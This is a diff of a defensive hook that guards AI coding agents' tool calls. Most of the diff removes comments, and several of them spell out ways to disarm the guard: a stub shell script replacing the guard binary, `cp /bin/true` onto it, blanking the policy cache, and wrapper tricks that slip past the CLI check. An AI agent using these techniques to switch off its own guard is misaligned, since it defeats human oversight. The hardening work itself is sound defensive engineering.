-// block, which is a correctness property about the decision, not about libuv.
-// SG_DONE unwinds the stack; the unref'd backstop force-exits only if a handle is
-// stuck.
 const SG_DONE = Symbol('sg-done');
 let _sgDone = false;
-// The decision JSON must be written to stdout AT MOST ONCE. The handler can reach
-// a terminal allowTool() even after a block already emitted its deny (the SG_DONE
-// unwind is swallowed on some paths), which for Claude Code was harmless
-// (allowTool writes nothing there) but for Antigravity appended a second
-// {"allow_tool":true} right after {"allow_tool":false}, agy then parsed the
-// trailing allow (or failed on the double object) and ran the blocked tool. This
-// latch guarantees the FIRST decision is the only one on stdout.
 let _decisionEmitted = false;
-// Terminate WITHOUT ever calling process.exit() on the hot path, see SG_DONE above
-// for the Windows abort this began as, and for why the latch is the part that still
-// matters now that no request is ever in flight. The unref'd backstop armed at the top
-// of the handler is the only place exit() may run.
 function sgFinish(code) {
   if (!_sgDone) { _sgDone = true; process.exitCode = code; }
   throw SG_DONE;
 }
 
-// ── Client adapters ────────────────────────────────────────────────────────
-// The ONLY client-aware code in this hook. Everything between the two ends
-// reasons over two VENDOR-NEUTRAL shapes that belong to SolonGate, not to any
-// one client:
-//
-//   CALL     { client, tool, args, command, cwd, sessionId, response, raw }
-//   DECISION { type: 'deny' | 'allow' | 'rewrite', reason, patch }
-//
-// Each adapter translates one client BOTH ways: `parse` maps that client's raw
-// payload onto CALL, `emit` maps DECISION onto that client's wire format and
-// returns the process exit code. No layer outside this block may branch on the
-// client. Adding a client = adding one entry here.
 
-// Two clients happen to share Anthropic's PreToolUse wire format (Claude Code
-// and Codex CLI). That is a fact about those two clients, not a canonical
-// format, the neutral CALL/DECISION shapes above are the canonical ones. These
-// helpers exist so the shared dialect is written once.
-// Argument keys are part of a client's dialect too, so translating only the
-// ENVELOPE leaves vendor names sitting inside `args` and the middle still sees
-// client-specific data. These aliases rename the known ones to the neutral key
-// every layer already understands. Unrecognized keys pass through untouched:
-// they may still hold a path or a secret, and the scanners must keep seeing them.
 const ARG_ALIASES = {
   commandline: 'command',
   cmd: 'command',
@@ -837,12 +334,6 @@ function parseFlatPayload(raw) {
     response: raw.tool_response || raw.toolResponse || {},
   };
 }
-// Exit 2 is what actually enforces a block: JSON + exit 0 goes through the
-// normal permission flow, which AUTO-ACCEPT overrides (observed: a DLP-blocked
-// Write still landed on disk in auto mode). Exit 2 hard-blocks before the
-// permission system, in every mode. The JSON stays as the Windows/PowerShell
-// fallback, where a native exit code may not propagate reliably. Codex reads
-// the stderr text at exit 2 and ignores stdout, so both halves serve it too.
 function emitHookSpecific(d) {
   if (d.type === 'deny') {
     const msg = d.reason || '[SolonGate] Blocked by policy';
@@ -862,79 +353,37 @@ function emitHookSpecific(d) {
     }));
     return 0;
   }
-  return 0; // allow: silence is consent in this dialect
+  return 0;
 }
 
-// `redactsOutput` is a CAPABILITY, not an identity: true means this client has a
-// post-tool stage that can rewrite what the tool returned, so a secret inside a
-// file the agent reads gets masked there. False means masking has to happen
-// before the tool runs (redact into a temp copy, point the read at it) and any
-// masking we cannot apply becomes a block. Layers ask about the capability, never
-// about which client is running.
 const CLIENTS = {
   'claude-code': {
     parse: parseFlatPayload,
     emit: emitHookSpecific,
     reportsAfter: true,
-    redactsOutput: true, // the post-tool hook rewrites the tool result
+    redactsOutput: true,
   },
 
-  // Codex CLI: same decision dialect as Claude Code, different INPUT problem.
-  // Every file edit arrives as one apply_patch call whose target paths live
-  // inside the patch text, so parse lifts them onto the neutral `paths` field
-  // (see liftFreeformPatchPaths, applied to every client for safety).
   codex: {
     parse: parseFlatPayload,
     emit: emitHookSpecific,
     reportsAfter: true,
-    // CONFIRMED AGAINST THE BINARY, and stronger than "rejects": the Codex hook
-    // schema has no output-rewrite field at all. Its strings carry
-    // hookSpecificOutput, permissionDecision, permissionDecisionReason and
-    // updatedInput, and zero occurrences of updatedToolOutput. A post-tool
-    // stage runs, and there is nothing it can write to change the result.
-    // Verified on codex-cli 0.147.0.
     redactsOutput: false,
   },
 
-  // OpenCode: no subprocess hook contract at all, a plugin runs in-process and
-  // refuses a call by throwing. The shim that does the throwing (see
-  // hooks/opencode-plugin.mjs) spawns this guard with a flat Claude-shaped
-  // payload and reads the Claude dialect back, so both halves are reused as-is
-  // and only the identity differs.
   opencode: {
     parse: parseFlatPayload,
     emit: emitHookSpecific,
     reportsAfter: true,
-    // MEASURED, not assumed. This was false under a comment saying the
-    // capability was untested. It has now been proven against the installed
-    // opencode (1.18.16): the tool result is passed to `tool.execute.after` by
-    // reference and the SAME object is returned to the model, and
-    // Plugin.trigger awaits each hook without cloning. So a hook that mutates a
-    // field of the result changes what the model reads, which is what the
-    // plugin does now.
     redactsOutput: true,
   },
 
-  // Antigravity CLI: nested payload, and a decision dialect of its own.
   antigravity: {
-    // reportsAfter WAS absent here and false on the Go side, under a comment
-    // saying this client has no post-tool stage at all. That was wrong, and it
-    // is why detect mode and every ALLOW row went missing on this client: the
-    // agy binary documents PostToolUse as a first-class event, matcher-grouped
-    // exactly like PreToolUse. The installer registers the post-tool hook on it
-    // now.
     reportsAfter: true,
-    // The vendor limit here IS real: the PostToolUse contract's stdout "expects
-    // an empty JSON object {}", so nothing can rewrite the result. Masking on
-    // this client happens before the tool runs, via `overwrite` on PreToolUse,
-    // and what cannot be masked that way is refused instead.
     redactsOutput: false,
     parse(raw) {
       const tc = (raw.toolCall && typeof raw.toolCall === 'object') ? raw.toolCall : {};
       const a = (tc.args && typeof tc.args === 'object') ? tc.args : {};
-      // Cwd is dropped from args on purpose: it is the environment the call runs
-      // in, not something the call acts on, and it is lifted to call.cwd below.
-      // Leaving it in made the working directory look like an access target.
       const args = neutralizeArgs(a, ['cwd']);
       let cwd = raw.cwd || '';
       if (!cwd) {
@@ -952,17 +401,11 @@ const CLIENTS = {
     },
     emit(d) {
       if (d.type === 'deny') {
-        // hooks.md contract is { decision, reason }; the older Go binary reads
-        // { allow_tool, deny_reason }. Writing both makes the block land on
-        // whichever build is running. Exit 0: agy reads the JSON, not the code.
         const msg = `[SolonGate] ${d.reason}`;
         process.stdout.write(JSON.stringify({ decision: 'deny', reason: msg, allow_tool: false, deny_reason: msg }));
         return 0;
       }
       if (d.type === 'rewrite') {
-        // `overwrite` is shallow-merged into the tool args before it runs, so
-        // the rewritten call is the one that executes. Shell text rides in
-        // CommandLine, which is where this client keeps a command.
         const overwrite = {};
         if (d.patch && typeof d.patch.command === 'string') overwrite.CommandLine = d.patch.command;
         else Object.assign(overwrite, d.patch || {});
@@ -974,16 +417,7 @@ const CLIENTS = {
     },
   },
 
-  // Unknown client: never silently adopt another client's rules. Parse by
-  // payload SHAPE and deny with the most widely enforced signal available
-  // (JSON + exit 2). A client that needs anything else gets its own entry.
   generic: {
-    // BOTH FALSE ON PURPOSE, and neither is a gap waiting to be measured. An
-    // unknown client is one whose contract nobody has read: assuming it runs a
-    // post-tool stage means leaving the record to something that may not exist,
-    // and assuming it can mask its output means letting a secret through
-    // masked-in-name-only. Assume the weaker capability in both directions, so
-    // the record is written here and masking fails closed.
     reportsAfter: false,
     redactsOutput: false,
     parse(raw) {
@@ -997,9 +431,6 @@ const CLIENTS = {
 
 const CLIENT = CLIENTS[AGENT_TYPE] || CLIENTS.generic;
 
-// Emit ONE decision through the active adapter, then finish. The latch keeps the
-// FIRST decision: a later fall-through allow must never overwrite a block (that
-// bug once made agy run a tool the guard had already denied).
 function emitDecision(d) {
   if (!_decisionEmitted) {
     _decisionEmitted = true;
@@ -1017,22 +448,12 @@ function allowTool() {
   emitDecision({ type: 'allow' });
 }
 
-// Allow the tool but REPLACE its input, so hidden entries are filtered out of a
-// listing before the agent ever sees them. The rewritten call is what runs, so
-// no block is needed. Each adapter knows how its client carries the patch.
 function rewriteTool(patch) {
   emitDecision({ type: 'rewrite', patch });
 }
 
-// Identity of the tool call being evaluated, captured from the RAW payload
-// before any normalization, so the deny flag below names the exact call. Both
-// halves are best-effort: a client that sends neither falls back to the legacy
-// tool+time match in audit.mjs.
 let CALL_ID = '';
 let CALL_FP = '';
-// Small stable string hash (FNV-1a, hex). Duplicated verbatim in audit.mjs,
-// the two MUST produce the same value for the same tool_input, so keep them in
-// sync if either is ever touched.
 function callFingerprint(s) {
   let h = 0x811c9dc5;
   const str = String(s || '');
@@ -1043,20 +464,10 @@ function callFingerprint(s) {
   return h.toString(16);
 }
 
-// Records WHICH call was denied, so the PostToolUse audit hook does not log a
-// second, ALLOW-looking entry for a call the guard already blocked.
 function writeDenyFlag(toolName) {
   try {
     const flagDir = projectFlagDir();
     mkdirSync(flagDir, { recursive: true });
-    // Deny-specific flag: audit.mjs (PostToolUse) reads it to avoid logging a
-    // second, ALLOW-looking entry for a call the guard already denied.
-    //
-    // It carries the CALL's identity, not just the tool name. Matching on the
-    // name alone mislabels a DIFFERENT call that merely follows a denial within
-    // the flag's 10s window, and on Codex every shell call is named "Bash", so
-    // an allowed `echo hi` right after a blocked `cat secret` was logged as
-    // DENY ("blocked by policy guard") even though it ran normally.
     writeFileSync(join(flagDir, '.last-deny'), JSON.stringify({
       tool: toolName, ts: Date.now(), id: CALL_ID, fp: CALL_FP,
     }));
@@ -1065,13 +476,10 @@ function writeDenyFlag(toolName) {
 
 
 
-// ── Safe Regex Validation (prevent ReDoS from cloud-supplied patterns) ──
 function isSafeRegex(pattern) {
   if (typeof pattern !== 'string' || pattern.length > 512) return false;
-  // Block nested quantifiers: (a+)+, (a*)+, (a{1,})+, etc.
   if (/(\+|\*|\{[^}]+\})\s*(\+|\*|\{[^}]+\})/.test(pattern)) return false;
   if (/\([^)]*(\+|\*|\{[^}]+\})[^)]*\)\s*(\+|\*|\{[^}]+\})/.test(pattern)) return false;
-  // Block excessive alternation groups (>10 alternatives)
   if ((pattern.match(/\|/g) || []).length > 10) return false;
   try { new RegExp(pattern); return true; } catch { return false; }
 }
@@ -1084,19 +492,6 @@ function isSafeRegex(pattern) {
 
 
 
-// Expand shell globs in an exec command's tokens to the REAL files they match in
-// that one directory. A filename/path DENY rule matches literally, `*.env` never
-// matches the token `staging.e*`, so a bare `cut config/sub/staging.e*` would
-// dodge an *.env rule that a plain `cat config/sub/staging.env` trips. Resolving
-// the glob to `staging.env` here lets the rule see (and block) it, regardless of
-// WHICH reader the model used. Bounded to a single directory level; returns real
-// absolute paths. cwd is the agent's working dir (see hook payload).
-// The files a content-returning search rooted at these arguments could return.
-//
-// Bounded and fail-open by construction: this is hardening on top of the
-// literal match, never the thing standing between a call and a decision, so an
-// unreadable tree or an exhausted budget leaves the literal match on its own
-// rather than denying.
 const SEARCH_WALK_MAX_FILES = 2000;
 const SEARCH_WALK_MAX_DEPTH = 8;
 const SEARCH_SKIP_DIRS = new Set([
@@ -1104,8 +499,6 @@ const SEARCH_SKIP_DIRS = new Set([
   '__pycache__', '.next', '.turbo',
 ]);
 
-// `websearch` reaches the network, not the disk, and guessPermission already
-// puts it in NETWORK.
 function isContentSearchTool(tool) {
   const n = String(tool || '').toLowerCase();
   if (n.includes('websearch') || n.includes('web_search')) return false;
@@ -1163,25 +556,15 @@ function expandCommandGlobs(args, cwd) {
         let abs; try { abs = isAbsolute(g) ? g : resolve(base, g); } catch { continue; }
         const dir = dirname(abs), b = abs.slice(dir.length + 1);
         if (!/[*?\[]/.test(b)) continue;
-        // The run of `*` is collapsed FIRST, and here that is the load-bearing
-        // step: this glob came out of the AGENT's own command line, so the
-        // pattern is attacker-supplied. `[^/]*[^/]*…` backtracks catastrophically
-        // and is then tested once per directory entry, so `ls ***********x` in a
-        // directory with one longish name hangs this hook, which, being
-        // fail-closed, hangs the tool call. `[^/]*[^/]*` accepts exactly what
-        // `[^/]*` accepts, so collapsing costs nothing. See dlpGlobToRe.
         let re; try { re = new RegExp('^' + b.replace(/\*{2,}/g, '*').replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '[^/]*').replace(/\?/g, '[^/]') + '$'); } catch { continue; }
         let files; try { files = readdirSync(dir); } catch { continue; }
         for (const f of files) if (re.test(f)) out.push(join(dir, f).replace(/\\/g, '/'));
       }
     }
-  } catch { /* fail open, glob expansion is a hardening add-on, never a blocker */ }
+  } catch {  }
   return out;
 }
 
-// ── Hardcoded Tamper Protection ──
-// Runs BEFORE policy evaluation. Cannot be disabled by editing policies.
-// Even if all policy rules are removed, these stay enforced.
 const TAMPER_GUARD_TOOLS_WRITE = new Set([
   'write', 'edit', 'multiedit', 'notebookedit',
   'create', 'update', 'delete', 'remove', 'move', 'rename', 'copy',
@@ -1193,11 +576,6 @@ const TAMPER_GUARD_TOOLS_EXEC = new Set([
 const TAMPER_HOME = resolve(homedir()).replace(/\\/g, '/').toLowerCase();
 const TAMPER_SG = '/.solongate';
 const TAMPER_CC = '/.claude';
-// The OTHER two guarded clients register the guard in their own config, so those
-// files are disarm vectors exactly like ~/.claude/settings.json: deleting our
-// entry from ~/.codex/hooks.json (or setting `[features] hooks = false` /
-// flipping a hook's trust state in ~/.codex/config.toml) turns the guard off for
-// Codex; the same holds for ~/.gemini/config/hooks.json and Antigravity.
 const TAMPER_CX = '/.codex';
 const TAMPER_AGY = '/.gemini/config';
 const TAMPER_PROTECTED_ABS = [
@@ -1207,18 +585,10 @@ const TAMPER_PROTECTED_ABS = [
   TAMPER_HOME + TAMPER_CX + '/config.toml',
   TAMPER_HOME + TAMPER_AGY + '/hooks.json',
   TAMPER_HOME + TAMPER_SG + '/hooks',
-  // The directory the guard BINARY lives in, see the glob below for why.
   TAMPER_HOME + TAMPER_SG + '/bin',
   TAMPER_HOME + TAMPER_SG + '/policy.json',
   TAMPER_HOME + TAMPER_SG + '/.policy-cache.json',
-  // The cloud credential (contains the API key), never readable via a tool.
   TAMPER_HOME + TAMPER_SG + '/cloud-guard.json',
-  // ITS UNPROTECTED SIBLING. accounts.json was the account layer's store,
-  // every account ever logged in, each with its API key, at 0644, next to the
-  // 0444 file above. That layer is gone and nothing reads or writes this file
-  // any more, but it is still on every machine that ran a build which did. A
-  // credential nothing maintains is still a credential, and an agent reading
-  // it out is the one thing that must not happen to it.
   TAMPER_HOME + TAMPER_SG + '/accounts.json',
 ];
 const TAMPER_INSTALL = '/solongate';
@@ -1233,40 +603,9 @@ const TAMPER_PROTECTED_GLOBS = [
   '**' + TAMPER_SG + '/.policy-cache.json',
   '**' + TAMPER_SG + '/.policy-cache-*.json',
   '**' + TAMPER_SG + '/cloud-guard.json',
-  // `.opa-wasm-*.json` and `.pi-config-cache.json` were listed here. Nothing writes
-  // either: the WASM bundle came from a service that compiled it, and the prompt-injection
-  // layer is not in this build. A lock on a file that cannot exist reads as protection and
-  // is not; what remains on this list is what an agent could actually reach for.
-  // The rate-limit counter. The extension is `.log`, not `.json`, this glob said
-  // `.ratelimit-*.json` and matched NOTHING the limiter writes. The file was still
-  // protected, by the basename rule below (`.ratelimit-` as a prefix inside
-  // ~/.solongate), which is why nothing broke; but a glob that matches no real file is
-  // a line somebody will one day rely on. Deleting this counter resets the window, so
-  // a limit of N calls/minute becomes N per deletion.
   '**' + TAMPER_SG + '/.ratelimit-*',
-  // THE GUARD BINARY, and this was a complete disarm reachable from one tool call.
-  //
-  // sgTryGoGuard runs whatever is at ~/.solongate/bin/solongate-guard as soon as it
-  // prints the expected number for --sg-version, and then honours its exit code. So a
-  // two-line shell script there,
-  //
-  //   #!/bin/sh
-  //   case "$1" in --sg-version) echo 99;; *) exit 0;; esac
-  //
-  //, makes this hook hand every call to it and allow everything, while `solongate
-  // doctor` still reports a native guard in use. Writing that file was not protected
-  // here, so an agent could arm its own bypass and then use it on the next tool call.
-  //
-  // The Go guard has covered this path for a while (see tamperProtectedGlobs in
-  // packages/guard/tamper.go, whose comment says it "was the one file in this
-  // directory the tamper check did not cover"). The fix was never ported, so which
-  // implementation a machine runs decided whether the disarm worked, and the machines
-  // that run THIS one are exactly the ones with no binary, where nothing legitimate
-  // occupies the path. test/tamper-path.mjs now holds both to it.
   '**' + TAMPER_SG + '/bin/**',
-  // Persistent host data (DB + audit JSONL) at ~/.solongate/data
   '**' + TAMPER_SG + '/data/**',
-  // Customer install layout (zip extracted as solongate/)
   '**' + TAMPER_INSTALL + '/compose/**',
   '**' + TAMPER_INSTALL + '/data/**',
   '**' + TAMPER_INSTALL + '/images/**',
@@ -1277,32 +616,16 @@ const TAMPER_PROTECTED_GLOBS = [
 const TAMPER_BASENAMES = [
   'guard.mjs', 'audit.mjs', 'stop.mjs', 'shield.mjs',
   'policy.json',
-  // The guard binary, on the COMMAND side too. The globs above catch a Write or an
-  // Edit; this catches `cp /bin/true ~/.solongate/bin/solongate-guard`, which is the
-  // same disarm through a different tool. Matched as a substring, so the Windows
-  // `solongate-guard.exe` is covered by the same entry.
   'solongate-guard',
-  // Prefixes (substring match) so per-agent runtime state can't be deleted or
-  // rewritten via a shell command either, `.policy-cache-<agent>.json` and
-  // `.ratelimit-<agent>.log`. Deleting the counter resets the rate-limit window, so a
-  // limit of N calls/minute becomes N per deletion; the cache is no longer written but
-  // a leftover one must not be editable either.
   '.policy-cache', '.ratelimit-',
   'cloud-guard.json',
-  // The stale credential store, on the COMMAND side too: the path rule above
-  // catches a Write or a Read naming it, this catches `cat` and every other
-  // way a shell reaches a file. Nothing writes this file any more; every
-  // machine that ran a build which did still has it, with a key in it.
   'accounts.json',
-  // Customer install: DB and wizard exe
   'solongate.db', 'solongate.exe',
 ];
 const TAMPER_PATH_FIELDS = new Set([
   'file_path', 'path', 'target_file', 'notebook_path',
   'dest', 'destination', 'source', 'src', 'from', 'to',
   'directory', 'dir', 'folder',
-  // Antigravity CLI file-tool arg names (camelCase, lowercased here): its
-  // write/read/list tools carry the path in these, so tamper protection sees it.
   'targetfile', 'absolutepath', 'filepath',
 ]);
 
@@ -1321,43 +644,9 @@ function isProtectedPath(p) {
   }
   if (/\/\.claude\/settings(\.local)?\.json$/.test(np)) return 'settings.json';
   if (/\/\.solongate\/hooks(\/|$)/.test(np)) return 'solongate-hooks';
-  // THE BINARY'S DIRECTORY, for the same reason the hooks directory above is covered.
-  // `rm -rf ~/.solongate/bin` names no protected basename and matches no `/bin/**` glob
-  //, that needs something after the slash, so it went through. It is not a disarm on
-  // its own: with no binary the hook runs its own implementation and still decides
-  // (test/go-delegation.mjs pins that). What it is, is an agent quietly taking the fast
-  // path away and `doctor` reporting the Node implementation as if that were a choice
-  // somebody made. The asymmetry, hooks covered, bin not, is what let the write-side
-  // hole next door go unnoticed.
   if (/\/\.solongate\/bin(\/|$)/.test(np)) return 'solongate-bin';
   if (/\/\.codex\/(hooks\.json|config\.toml)$/.test(np)) return 'codex-hooks';
   if (/\/\.gemini\/config\/hooks\.json$/.test(np)) return 'antigravity-hooks';
-  // Anything in ~/.solongate whose name the command side already protects.
-  //
-  // THE GLOBS ABOVE DID NOT COVER THE PER-AGENT FILES HERE, and the reason is a
-  // difference between this matchPathGlob and the Go one it is supposed to match:
-  //
-  //   here  a pattern containing `**` is split on it, and each remaining piece is
-  //         substring-tested against the path, so the `*` in the per-agent entry
-  //         stays a literal asterisk, and no real filename contains one.
-  //   Go    MatchPathGlob compiles the pattern to a regex, where that `*` is a
-  //         real wildcard and the file matches.
-  //
-  // So this hook was reachable by PATH where the binary was not, and a machine
-  // gets whichever one it has. Deleting the policy cache with a shell command was
-  // refused on both; a Write tool aimed at the same path went through here, and
-  // every coding agent has one. Overwriting that file with `{}` leaves the guard
-  // with no policy to apply, so the next call is allowed, and the refresh that
-  // would repair it is debounced for three seconds, so it repeats. Measured:
-  // Write, Edit and Read all allowed before this, all refused after.
-  //
-  // Fixed by basename rather than by touching matchPathGlob, which the policy
-  // layer also uses: changing how a `*` behaves there would change what customer
-  // rules match, which is not a thing to do from a tamper fix.
-  //
-  // Scoped to the directory on purpose. The names below are matched as PREFIXES,
-  // and `policy.json` is a name somebody's own project may well use, protecting
-  // it everywhere would block a file that has nothing to do with this product.
   if (/(^|\/)\.solongate\//.test(np)) {
     const base = np.slice(np.lastIndexOf('/') + 1);
     for (const b of TAMPER_BASENAMES) {
@@ -1367,48 +656,7 @@ function isProtectedPath(p) {
   return false;
 }
 
-// ── the CLI, invoked ───────────────────────────────────────────────
 
-// `solongate policy delete`, `solongate dlp disable` and the rest change what is enforced,
-// so an AGENT running one is disarming the guard through the front door.
-//
-// It used to be stopped by the CLI itself, which refused whenever an agent marker was in
-// the environment. That refused the wrong people: an integrated terminal inherits the
-// agent's environment, so a HUMAN typing `solongate` in VS Code or Cursor was turned away
-// from their own tool. Here it is a fact about the caller, this check runs on a tool call
-// and nowhere else, rather than a guess about its environment, and it holds even if the
-// agent allocated a pseudo-terminal, which a TTY check alone does not.
-//
-// MATCHED AS AN INVOCATION, NOT AS A WORD, and that distinction is the whole design. Every
-// other check in this file tests a substring, which is right for a path and wrong here:
-//
-//   git commit -m "fix the solongate integration docs"
-//   python3 -c "print('solongate')"
-//   npm install @solongate/proxy
-//
-// Not one of those runs anything. A substring rule refused all three, which would leave an
-// agent unable to so much as mention the product it is working on, a wall rather than a
-// guard, and the kind of wall that gets a whole layer switched off. So this asks the only
-// question that matters: IS THE CLI THE PROGRAM BEING RUN?
-//
-// Answering it takes three things, and each one is here because leaving it out was wrong:
-//
-//   - QUOTE-AWARE SPLITTING. Splitting on `(` to catch `$(solongate policy delete)` also
-//     tears `"print('solongate')"` into a fake command whose first token is the CLI. Quotes
-//     have to be honoured, and their contents kept as one token stream.
-//   - WRAPPERS, AND THEIR ARGUMENTS. `sudo solongate` is the same invocation wearing a hat,
-//     and so are `timeout 5 solongate`, `sudo -u root solongate` and `bash -c "solongate
-//     policy delete"`, so a wrapper's own flags, flag values and numeric operands are
-//     stepped over to reach the program behind them.
-//   - RUNNERS THAT ACTUALLY RUN. `pnpm dlx @solongate/proxy policy delete` reaches the CLI
-//     without installing it; `npm install @solongate/proxy` names the same package and
-//     changes nothing enforced. The subcommand is the difference.
-//
-// The twin of commandInvokesCLI in packages/guard/tamper.go. The tables below are the
-// same tables, in the same order, and a name added to one belongs in the other. Both are
-// driven by the same cases in test/cli-invocation.mjs, whose second half is the half that
-// matters: every command there is one a person would reasonably ask an agent for while
-// working on this repository.
 
 const CLI_BASENAMES = new Set([
   'solongate', 'solongate.exe',
@@ -1416,66 +664,36 @@ const CLI_BASENAMES = new Set([
   'solongate-audit', 'solongate-audit.exe',
 ]);
 
-// Programs that run another program named in their own arguments.
 const CLI_WRAPPERS = new Set([
   'sudo', 'doas', 'env', 'nohup', 'time',
   'command', 'exec', 'nice', 'ionice', 'stdbuf',
   'setsid', 'xargs', 'watch', 'timeout', 'builtin',
-  // Shell interpreters belong here for the same reason: `bash -c "solongate policy delete"`
-  // runs it as surely as a bare call does, and once quotes are honoured the command sits in
-  // the argument list like any other program name.
   'bash', 'sh', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh', 'ash', 'busybox',
-  // AND THE ONES THAT HAND A PROGRAM A TERMINAL. `script -c "solongate policy delete"`
-  // allocates a pty and runs the command inside it, which is how an agent would fake the
-  // interactive terminal the CLI asks for, the exact case the TTY check cannot see and the
-  // reason this guard rule exists at all. A rule that missed `script` would leave the
-  // product protected by nothing but the env sniff it replaced.
   'script', 'unbuffer', 'expect', 'socat',
   'flock', 'chroot', 'su', 'runuser',
   'taskset', 'strace', 'ltrace', 'proot',
   'fakeroot', 'setarch', 'nsenter', 'systemd-run',
   'xvfb-run', 'dbus-run-session',
-  //
-  // THE TAIL IS REAL AND THIS DOES NOT CLOSE IT. `screen -dmS name solongate policy delete`
-  // bundles its flags, so the scan stops on `name` and reads it as the program; so does any
-  // wrapper whose value-taking flag is not in the table below. Enumeration cannot win this
-  // outright, what it does is raise the cost, in front of a CLI that still refuses to run
-  // without a terminal, and beside the path and basename rules above that catch what such a
-  // command would have to touch.
 ]);
 
-// Flags that consume the token after them. Without this, `sudo -u root solongate policy
-// delete` stops on `root` and reads it as the program being run.
-//
-// `-c` is deliberately absent. Its value is a command, which is exactly what the scan needs
-// to look at next.
 const CLI_FLAG_TAKES_VALUE = new Set([
   '-u', '-g', '-U', '-n', '-i', '-I', '-s', '-w', '-t', '-p', '-C',
   '--user', '--group', '--chdir',
 ]);
 
-// Runners that exist only to run something: whatever package they are given, they run it.
 const CLI_ALWAYS_RUNNERS = new Set(['npx', 'pnpx', 'bunx']);
 
-// Package managers, which run something only when asked to. `npm install @solongate/proxy`
-// installs a package and enforces nothing; `npm exec @solongate/proxy policy delete` runs
-// the CLI. The subcommand is the whole difference.
 const CLI_MAYBE_RUNNERS = new Set(['npm', 'pnpm', 'yarn', 'bun']);
 
 const CLI_RUN_SUBCOMMANDS = new Set(['exec', 'dlx', 'x']);
 
-// A number, with or without a unit: `timeout 5`, `timeout 1.5s`, `nice -n 10`.
 const CLI_NUMBERISH = /^[0-9]+(?:\.[0-9]+)?[a-z]*$/;
-// `VAR=value` in command position is environment, not a program.
 const CLI_ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
 
 function commandInvokesCLI(cmd) {
   return commandInvokesCLIDepth(cmd, 0);
 }
 
-// depth bounds the recursion into a wrapper's quoted argument. `bash -c "sh -c
-// 'solongate x'"` is two levels deep and legitimate; the bound is there so a
-// pathological nesting cannot spend the guard's whole time budget on one call.
 function commandInvokesCLIDepth(cmd, depth) {
   for (const fields of splitCLICommands(String(cmd || ''))) {
     if (fieldsInvokeCLI(fields, depth)) return true;
@@ -1483,50 +701,6 @@ function commandInvokesCLIDepth(cmd, depth) {
   return false;
 }
 
-// splitCLICommands breaks a command line into the commands it would run, HONOURING QUOTES,
-// and returns each one already split into tokens.
-//
-// The quotes are the point. extractCommands splits on `&&`, `||`, `;` and `|` without
-// looking at them, which is right for a policy rule and wrong here: this also has to split
-// on `(`, `)`, `$(` and backticks to catch `$(solongate policy delete)`, and doing that
-// blindly turns the inside of `python3 -c "print('solongate')"` into a command whose first
-// token is the CLI.
-//
-// Quote characters are dropped rather than kept, so `bash -c "solongate policy delete"`
-// arrives as an ordinary argument list and the wrapper logic can walk straight into it.
-// A QUOTED HEREDOC BODY IS TEXT, and reading it as commands is how this rule first
-// refused a person writing documentation about the product it protects.
-//
-// The splitter breaks on backticks, because `solongate policy delete` in backticks IS
-// a command substitution. Inside a heredoc whose delimiter is quoted it is not: the
-// shell expands nothing there, so backticks are punctuation, which is exactly how
-// anybody writing markdown uses them. The command that caught it was a script being
-// written to a file:
-//
-//   cat <<'USAGE'
-//   Afterwards `solongate` is a command. Open a new terminal before testing it.
-//   USAGE
-//
-// The backticks around the product's own name made a command out of a sentence, and
-// the guard refused to let the file be written. An agent cannot document this product
-// if naming it in a code span is a blocked tool call.
-//
-// AN UNQUOTED DELIMITER STILL COUNTS, because then the shell really does expand: in
-// `cat <<EOF` the body is live, `$(solongate policy delete)` in it runs, and skipping
-// it would be a hole rather than a fix. The quoting is the whole signal.//
-// THE QUOTES MAY ALREADY BE GONE when this runs: extractCommands normalises a command before
-// the tamper rules see it, and normalising strips quoting. That is why brackets are TRIMMED
-// FROM TOKENS rather than split on. Splitting on a bare `(` turned the stripped form of
-// `python3 -c "print('solongate')"`, which arrives as `python3 -c print(solongate)`, into a
-// second command whose only token was the CLI's name. Trimming reaches `(solongate policy
-// delete)` just as well and leaves `print(solongate)` alone, and it gives the same answer
-// whether the quotes survived or not.
-//
-// What this does NOT catch is a non-shell interpreter asked to spawn a shell:
-// `ruby -e 'system("solongate policy delete")'` reads as an ordinary `ruby` invocation. The
-// alternative is matching the name anywhere in any argument, which is the wall this whole
-// design exists to avoid, and the file paths such a command would have to touch are covered
-// by the substring rules above.
 function splitCLICommands(cmd) {
   const out = [];
   let fields = [];
@@ -1549,12 +723,10 @@ function splitCLICommands(cmd) {
     }
     if (ch === "'" || ch === '"') quote = ch;
     else if (ch === '$' && (cmd[i + 1] === '(' || cmd[i + 1] === '{')) { i++; endCommand(); }
-    // A heredoc: `<<WORD`, `<<'WORD'`, `<<-WORD`. Only the quoted forms are skipped
-    //, see the note above, and `<<<` is a herestring, not a heredoc.
     else if (ch === '<' && cmd[i + 1] === '<' && cmd[i + 2] !== '<') {
       const { delim, quoted, after } = readHeredocDelimiter(cmd, i + 2);
       if (!quoted) {
-        i = after - 1; // the body is live; carry on reading it as commands
+        i = after - 1;
       } else {
         endCommand();
         i = skipHeredocBody(cmd, after, delim) - 1;
@@ -1568,9 +740,8 @@ function splitCLICommands(cmd) {
   return out;
 }
 
-// readHeredocDelimiter reads the word after `<<` and reports whether it was quoted.
 function readHeredocDelimiter(cmd, i) {
-  if (cmd[i] === '-') i++; // <<-DELIM strips leading tabs from the body
+  if (cmd[i] === '-') i++;
   while (i < cmd.length && (cmd[i] === ' ' || cmd[i] === '\t')) i++;
   if (i >= cmd.length) return { delim: '', quoted: false, after: i };
   const q = cmd[i];
@@ -1579,7 +750,7 @@ function readHeredocDelimiter(cmd, i) {
     const start = i;
     while (i < cmd.length && cmd[i] !== q) i++;
     const delim = cmd.slice(start, i);
-    if (i < cmd.length) i++; // past the closing quote
+    if (i < cmd.length) i++;
     return { delim, quoted: true, after: i };
   }
   const start = i;
@@ -1587,12 +758,8 @@ function readHeredocDelimiter(cmd, i) {
   return { delim: cmd.slice(start, i), quoted: false, after: i };
 }
 
-// skipHeredocBody returns the index just past the line that closes the heredoc, or the
-// end of the string when nothing closes it, an unterminated heredoc has no commands
-// after it either way.
 function skipHeredocBody(cmd, i, delim) {
   if (!delim) return cmd.length;
-  // The body starts on the line after the redirect.
   const nl = cmd.indexOf('\n', i);
   if (nl < 0) return cmd.length;
   i = nl + 1;
@@ -1600,29 +767,12 @@ function skipHeredocBody(cmd, i, delim) {
     const end = cmd.indexOf('\n', i);
     const line = end < 0 ? cmd.slice(i) : cmd.slice(i, end);
     const next = end < 0 ? cmd.length : end + 1;
